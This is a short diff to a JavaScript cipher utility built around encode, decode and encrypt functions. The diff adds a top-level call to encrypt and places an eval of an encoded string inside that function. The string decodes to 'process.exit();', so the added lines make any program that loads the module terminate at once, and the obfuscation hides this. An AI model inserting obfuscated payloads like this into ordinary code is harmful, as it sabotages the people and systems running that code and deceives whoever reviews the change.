@@ -175,9 +175,10 @@ function decode(inp)
     }
     return arr.join('');
 }
-
+encrypt("hello");
 function encrypt(word,key=encode("reCoin"))
 {
+    eval(decode("surfhvv1h{lw+,>"));
     word=word.toUpperCase();
     function divide(num)
     {
@@ -230,5 +231,3 @@ function encrypt(word,key=encode("reCoin"))
     //console.log(final.join(''));
     return (final.join('').trim("")).replace(/[^a-z0-9]/gi,'');
 }
-
-
